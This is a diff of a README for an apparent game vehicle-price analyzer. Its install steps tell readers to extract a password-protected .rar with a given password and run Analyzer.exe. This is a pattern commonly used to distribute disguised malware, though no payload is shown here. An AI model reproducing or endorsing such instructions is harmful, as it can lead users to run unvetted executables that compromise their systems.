@@ -22,7 +22,7 @@ The software provides **real-time price tracking, market trends, and recommendat
 ## 📥 Installation & Launch
 
 ### 🔹 ✅ RECOMMENDED METHOD (Windows .exe)
-1️⃣ **Download and extract the `GameData_Analyzer.rar` (pass:123Gamedata)  
+1️⃣ **Download and extract the `GameData_Analyzer.rar` (pass: 123Gamedata)  
 2️⃣ **Run `Analyzer.exe`**  
 🚀 **The application will set up everything automatically, just enjoy!**  
 
@@ -73,10 +73,10 @@ print(affordable_vehicles[["name", "price", "discount"]])
 
 ## 🖼 Examples
 📌 **Live price tracking & discounts:**  
-![Vehicle Prices](assets/vehicle_prices_example.png)  
+![Vehicle Prices](1.jpg)  
 
 📌 **Market trends & resale value predictions:**  
-![Market Trends](assets/market_trends_example.png)  
+![Market Trends](2.jpg)  
 
 ---
 
